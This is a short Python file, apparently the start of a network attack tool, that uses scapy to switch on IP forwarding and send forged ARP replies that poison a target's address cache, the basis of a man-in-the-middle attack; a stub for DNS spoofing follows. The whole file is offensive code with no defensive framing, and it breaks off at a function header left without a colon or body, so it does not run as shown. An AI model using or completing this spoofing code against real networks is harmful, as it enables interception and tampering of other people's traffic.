import os

import scapy.all as scapy

def enable_packet_forwarding():
    return os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") == 0

def disable_packet_forwarding():
    return os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") == 0

def spoof_addresses(ipSentTo, changeIP, changeMAC):
	packet = scapy.ARP(op=2, psrc=changeIP, hwsrc=changeMAC, pdst=ipSentTo, hwdst=scapy.getmacbyip(ipSentTo))
	scapy.send(packet, verbose=False)

def spoof_domain_name()